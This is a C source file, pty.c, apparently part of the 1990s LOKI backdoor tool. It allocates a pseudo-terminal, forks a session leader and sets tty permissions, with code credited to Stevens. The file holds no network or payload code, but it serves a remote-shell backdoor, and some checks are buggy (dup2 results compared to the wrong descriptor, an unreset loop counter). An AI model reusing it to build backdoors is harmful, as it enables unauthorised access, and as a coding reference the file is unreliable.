/*
 * LOKI
 *
 * [ pty.c ]
 *
 *  1996/7 Guild Corporation Worldwide      [daemon9]
 *  All the PTY code ganked from Stevens.
 */

#ifdef  PTY
#include "loki.h"

extern int verbose;    

/*
 *  Open a pty and establish it as the session leader with a 
 *  controlling terminal
 */

pid_t pty_fork(int *fdmp, char *slavename, struct termios *slave_termios, struct winsize *slave_winsize)
{

    int fdm, fds;          
    pid_t pid;
    char pts_name[20];

    if ((fdm = ptym_open(pts_name)) < 0) 
        err_exit(1, 0, verbose, "\nCannot open master pty\n");

    if (slavename) strcpy(slavename, pts_name);

    if ((pid = fork()) < 0) return (-1);

    else if (!pid)
    {
        if (setsid() < 0) 
            err_exit(1, 1, verbose, "\nCannot set session");

        if ((fds = ptys_open(fdm, pts_name)) < 0)
            err_exit(1, 0, verbose, "\nCannot open slave pty\n");
        close(fdm);                  

#if defined(TIOCSCTTY) && !defined(CIBAUD)
        if (ioctl(fds, TIOCSCTTY,(char *)0) < 0)
            err_exit(1, 1, verbose, "\nioctl");
#endif
                                        /* set termios/winsize */
        if (slave_termios) if (tcsetattr(fds,TCSANOW, (struct termios *)slave_termios) < 0) err_exit(1, 1, verbose, "\nCannot set termio");
	                                /* slave becomes stdin/stdout/stderr */
        if (slave_winsize) if (ioctl(fds, TIOCSWINSZ, slave_winsize) < 0)
            err_exit(1, 1, verbose, "\nioctl");
        if (dup2(fds, STDIN_FILENO) != STDIN_FILENO)
            err_exit(1, 0, verbose, "\ndup\n");
        if (dup2(fds, STDOUT_FILENO) != STDIN_FILENO)
            err_exit(1, 0, verbose, "\ndup\n");
        if (dup2(fds, STDERR_FILENO) != STDIN_FILENO)
            err_exit(1, 0, verbose, "\ndup\n");
        if (fds > STDERR_FILENO) close(fds);

        return (0);                     /* return child */ 
    }

    else
    {
        *fdmp = fdm;                    /* Return fd of master */
        return (pid);                   /* parent returns PID of child */ 
    }
}


/*
 *  Determine which psuedo terminals are available and try to open one
 */

int ptym_open(char *pts_name)
{

    int fdm     = 0;                    /* List of ptys to run through */
    char *p1    = "pqrstuvwxyzPQRST", *p2 = "0123456789abcdef";

    strcpy(pts_name, "/dev/pty00");     /* pty device name template */

    for (; *p1; p1++)
    {
        pts_name[8] = *p1;
        for (; *p2; p2++)
        {
            pts_name[9] = *p2;
            if ((fdm = open(pts_name, O_RDWR)) < 0)
            {
                                        /* device doesn't exist */
	        if (errno == ENOENT) return (-1);
                else continue;
            }
            pts_name[5] = 't';          /* pty -> tty */
            return (fdm);               /* master file descriptor */
        }	
    }
    return (-1);                        /* control falls here if no pty
                                         * devices are available
                                         */
}


/*
 *  Open the slave device and set ownership and permissions
 */

int ptys_open(int fdm, char *pts_name)
{

    struct group *gp;
    int gid = 0, fds = 0;

    if ((gp = getgrnam("tty"))) gid = (gp -> gr_gid);
    else gid = -1;                              /* Group tty is not in the group file */

    chown(pts_name, getuid(), gid);             /* make it ours */
                                                /* set permissions -rw--w---- */
    chmod(pts_name, S_IRUSR | S_IWUSR | S_IWGRP);   

    if ((fds = open(pts_name, O_RDWR)) < 0)
    {
        close(fdm);                            /* Cannot open fds */
        return (-1);
    }
    return (fds);
}

#endif

/* EOF */
